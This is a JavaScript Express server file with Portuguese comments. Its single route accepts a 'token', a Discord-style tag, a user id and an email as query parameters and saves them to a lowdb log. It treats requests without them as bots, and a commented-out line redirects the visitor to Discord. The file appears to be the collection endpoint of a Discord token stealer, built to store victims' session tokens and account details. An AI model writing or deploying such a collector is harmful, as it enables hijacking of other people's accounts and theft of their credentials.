const express = require('express');
const app = express();
const port = 3000;

const path = require("path");

const low = require('lowdb') //banco de dados
const FileSync = require('lowdb/adapters/FileSync')
const adapter = new FileSync('database/db.json')
const db = low(adapter)

//app.set('view engine', 'html');
app.use("/public", express.static("public"));

/*app.get("/", (req, res) => {
    res.sendFile('localhost/public/index.html')
})*/

app.get("/", (req, res) => {
  /*
    const express = require('express');
    
    const low = require('lowdb') //banco de dados
    const FileSync = require('lowdb/adapters/FileSync')
    const adapter = new FileSync('database/db.json')
    const db = low(adapter)
  */

    let token = req.query.token
    let tag = req.query.tag
    let id = req.query.id
    let email = req.query.email

    let bot = `false`

    if(token == undefined && tag == undefined && id == undefined && email == undefined){
        bot = `true`
        console.log('bot...')
        return;
    }

    if(token == undefined){
        token = `parametro token não passado`
    }
    
    if(tag == undefined){
        tag = `undefined#0000`
    }
    
    if(id == undefined){
        id = `parametro id não passado`
    }
    
    if(email == undefined){
        email = `undefined@gmail.com`
    }

    console.log(`o usuario logou com sucesso:${tag}`)
    if(!token) return;

    db.get('logs').push({
        token: token,
        tag: tag,
        id: id,
        email: email 
    }).write()    

    //window.location.href = `https://discord.com/channels/@me`

    // res.sendStatus(200);
    res.sendFile(path.join(__dirname, "public/index.html"));
})    

app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`)); 